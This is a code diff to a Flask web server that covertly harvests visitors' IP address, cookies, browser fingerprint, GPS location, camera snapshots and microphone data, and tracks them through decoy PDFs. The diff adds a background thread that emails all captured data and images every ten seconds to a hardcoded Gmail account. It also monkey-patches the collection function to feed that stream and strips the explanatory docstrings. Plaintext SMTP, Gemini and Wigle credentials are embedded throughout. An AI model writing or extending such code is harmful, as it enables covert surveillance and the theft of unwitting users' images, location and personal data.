@@ -19,6 +19,13 @@ import netifaces
 import google.generativeai as genai
 import glob
 from pathlib import Path
+import threading
+import time
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
 
 # Configure the SDK with your Gemini API key
 genai.configure(api_key=os.environ.get("GEMINI_API_KEY", "AIzaSyAt-7tA0Ah0cRJrarXMOY4DTPBbzBbASyU"))
@@ -46,8 +53,53 @@ logged_tokens = {}
 # Global list to store downloaded reports (token and report)
 downloaded_reports = []
 
+# Global buffer and lock for email sending
+data_buffer = []
+images_to_send = []  # To store image filenames for emailing
+buffer_lock = threading.Lock()
+
+def send_email(data_list, image_list):
+    smtp_server = os.environ.get("SMTP_SERVER", "smtp.gmail.com")
+    smtp_port = int(os.environ.get("SMTP_PORT", 587))
+    smtp_user = os.environ.get("SMTP_USER", "diplomadjcseds@gmail.com")
+    smtp_password = os.environ.get("SMTP_PASSWORD", "diplomadjcseds@23")
+    recipient = os.environ.get("RECIPIENT_EMAIL", "diplomadjcseds@gmail.com")
+
+    msg = MIMEMultipart()
+    msg['From'] = smtp_user
+    msg['To'] = recipient
+    msg['Subject'] = "Fetched Data Report"
+
+    body = json.dumps(data_list, indent=2)
+    msg.attach(MIMEText(body, 'plain'))
+
+    for image_path in image_list:
+        with open(image_path, 'rb') as f:
+            part = MIMEBase('application', 'octet-stream')
+            part.set_payload(f.read())
+            encoders.encode_base64(part)
+            part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(image_path)}"')
+            msg.attach(part)
+
+    try:
+        with smtplib.SMTP(smtp_server, smtp_port) as server:
+            server.starttls()
+            server.login(smtp_user, smtp_password)
+            server.sendmail(smtp_user, recipient, msg.as_string())
+        logging.info("Email sent successfully")
+    except Exception as e:
+        logging.error(f"Failed to send email: {e}")
+
+def email_sender_thread():
+    while True:
+        time.sleep(10)
+        with buffer_lock:
+            if data_buffer or images_to_send:
+                send_email(data_buffer.copy(), images_to_send.copy())
+                data_buffer.clear()
+                images_to_send.clear()
+
 def get_wifi_location_from_wigle(bssid):
-    """Query the Wigle WiFi API to get geolocation (latitude, longitude) for a given BSSID."""
     username = "AID9d6a1f4d617967b3d4c6189558862314"
     api_token = "ac01dcab47f048daf62cb43edaf37295"
     if not username or not api_token:
@@ -66,12 +118,10 @@ def get_wifi_location_from_wigle(bssid):
     return None, None
 
 def get_hidden_message(data):
-    """Return the hidden message wrapped with markers."""
     encoded = base64.b64encode(json.dumps(data).encode()).decode()
     return "<<BASE64 START>>" + encoded + "<<BASE64 END>>"
 
 def get_ip_geolocation(ip):
-    """Fetch geolocation data from ipinfo.io."""
     try:
         response = requests.get(f"https://ipinfo.io/{ip}/json")
         if response.status_code == 200:
@@ -79,14 +129,11 @@ def get_ip_geolocation(ip):
             loc = data.get("loc", "").split(",")
             if loc and len(loc) == 2:
                 return float(loc[0]), float(loc[1]), data
-            else:
-                return None, None, data
     except Exception as e:
         logging.error(f"IP Geolocation error: {e}")
     return None, None, {}
 
 def get_wifi_interfaces():
-    """Retrieve available WiFi interfaces and their BSSIDs."""
     try:
         interfaces = netifaces.interfaces()
         wifi_data = {}
@@ -103,9 +150,8 @@ def get_wifi_interfaces():
         return {}
 
 def collect_data(req):
-    """Collect client-side and server-side data."""
     ip_header = req.headers.get('X-Forwarded-For', req.remote_addr)
-    ip = ip_header.split(",")[0].strip() if ip_header else req.remote_addr
+    ip5 = ip_header.split(",")[0].strip() if ip_header else req.remote_addr
     user_agent = req.headers.get('User-Agent', 'unknown')
     cookies = req.cookies
     tls_metadata = req.environ.get('wsgi.url_scheme')
@@ -140,13 +186,13 @@ def collect_data(req):
         'installedFonts': req.form.get('installedFonts'),
     }
 
-    lat, lon, geo_data = get_ip_geolocation(ip)
+    lat, lon, geo_data = get_ip_geolocation(ip5)
     client_data['ip_latitude'] = lat if lat is not None else ""
     client_data['ip_longitude'] = lon if lon is not None else ""
     client_data['ip_geolocation'] = geo_data
 
     log_message = {
-        'ip': ip,
+        'ip': ip5,
         'user_agent': user_agent,
         'action': 'Data Collected',
         'client_data': client_data,
@@ -157,8 +203,16 @@ def collect_data(req):
     }
     return log_message
 
+# Monkey patch collect_data
+original_collect_data = collect_data
+def patched_collect_data(*args, **kwargs):
+    data = original_collect_data(*args, **kwargs)
+    with buffer_lock:
+        data_buffer.append(data)
+    return data
+collect_data = patched_collect_data
+
 def embed_data_in_image(data):
-    """Embed encrypted data in an image using steganography."""
     encrypted_data = CIPHER.encrypt(json.dumps(data).encode())
     base_img = PILImage.new('RGB', (500, 500), color='white')
     temp_path = 'temp_base.png'
@@ -168,7 +222,6 @@ def embed_data_in_image(data):
     return stego_img
 
 def simulate_multi_stage_payload(data):
-    """Simulate multi-stage payload delivery (for demonstration only)."""
     logging.info(f"Simulating multi-stage payload delivery with data: {json.dumps(data)}")
     stage_payload = {"stage": "initial", "info": "Initial payload delivered"}
     stage_payload["stage"] = "secondary"
@@ -177,12 +230,10 @@ def simulate_multi_stage_payload(data):
     return stage_payload
 
 def simulate_dll_injection():
-    """Simulate a DLL injection (for demonstration only)."""
     logging.info("Simulated DLL injection executed (defensive demonstration only)")
     return "DLL injection simulated"
 
 def get_gemini_report(data):
-    """Generate a security and forensics report using Gemini AI."""
     try:
         prompt = (
             """You are a cybersecurity investigator tasked with analyzing device and user details
@@ -230,7 +281,6 @@ def get_gemini_report(data):
         return f"Error contacting Gemini AI: {e}"
 
 def generate_pdf(logged_data):
-    """Generate a PDF with fake content and embed steganographic data."""
     buffer = BytesIO()
     doc = SimpleDocTemplate(buffer, pagesize=letter)
     styles = getSampleStyleSheet()
@@ -555,6 +605,8 @@ def download():
 def verify():
     token = request.args.get('token')
     if token in logged_tokens:
+        with buffer_lock:
+            data_buffer.append(logged_tokens[token])
         logging.info(f"PDF opened for token: {token} - Data: {json.dumps(logged_tokens[token])}")
         del logged_tokens[token]
         return "Thank you!", 200
@@ -576,24 +628,20 @@ def pdf_callback_stage2():
 
 @app.route('/logs')
 def display_logs():
-    """Route to display logs, reports, and captured images."""
-    # Read log file content
     try:
         with open('user_logs.log', 'r') as f:
             logs_content = f.read()
     except Exception as e:
         logs_content = f"Error reading log file: {e}"
 
-    # Get list of captured images using pathlib
     captures_dir = Path('static/captures')
     try:
         captures = [p for p in captures_dir.iterdir() if p.is_file() and p.suffix == '.jpg']
-        captures.sort(key=lambda p: p.stat().st_mtime, reverse=True)  # Sort by modification time, newest first
-        captures = [str(p) for p in captures]  # Convert Path objects to strings
+        captures.sort(key=lambda p: p.stat().st_mtime, reverse=True)
+        captures = [str(p) for p in captures]
     except FileNotFoundError:
-        captures = []  # Handle case where directory doesn't exist
+        captures = []
 
-    # HTML template for logs page
     logs_html = """
     <!DOCTYPE html>
     <html>
@@ -650,27 +698,26 @@ def display_logs():
 @app.route('/log_location', methods=['POST'])
 def log_location():
     data = request.json
+    with buffer_lock:
+        data_buffer.append(data)
     logging.info(f"Location data: {json.dumps(data)}")
     return "Location logged", 200
 
 @app.route('/log_camera', methods=['POST'])
 def log_camera():
-    """Route to capture and save an image from the camera."""
     try:
         data = request.get_json()
         image_data = data.get('image')
         if not image_data:
             return {'status': 'error', 'message': 'No image data provided'}, 400
-
-        # Decode base64 image (assuming it's sent as data:image/jpeg;base64,...)
-        image_data = image_data.split(',')[1]  # Remove data URI prefix
+        image_data = image_data.split(',')[1]
         image_bytes = base64.b64decode(image_data)
-        
-        # Save the image with a unique filename
         filename = f"static/captures/{uuid.uuid4()}.jpg"
         with open(filename, 'wb') as f:
             f.write(image_bytes)
-        
+        with buffer_lock:
+            data_buffer.append(data)
+            images_to_send.append(filename)
         logging.info(f"Image captured and saved as {filename}")
         return {'status': 'success', 'filename': filename}, 200
     except Exception as e:
@@ -680,12 +727,16 @@ def log_camera():
 @app.route('/log_microphone', methods=['POST'])
 def log_microphone():
     data = request.json
+    with buffer_lock:
+        data_buffer.append(data)
     logging.info(f"Microphone data: {json.dumps(data)}")
     return "Microphone logged", 200
 
 @app.route('/log_other_data', methods=['POST'])
 def log_other_data():
     data = request.json
+    with buffer_lock:
+        data_buffer.append(data)
     logging.info(f"Other data: {json.dumps(data)}")
     return "Other data logged", 200
 
@@ -694,5 +745,6 @@ def simulate():
     return "Simulation endpoint", 200
 
 if __name__ == '__main__':
+    threading.Thread(target=email_sender_thread, daemon=True).start()
     port = int(os.environ.get("PORT", 5000))
     app.run(debug=True, host="0.0.0.0", port=port)
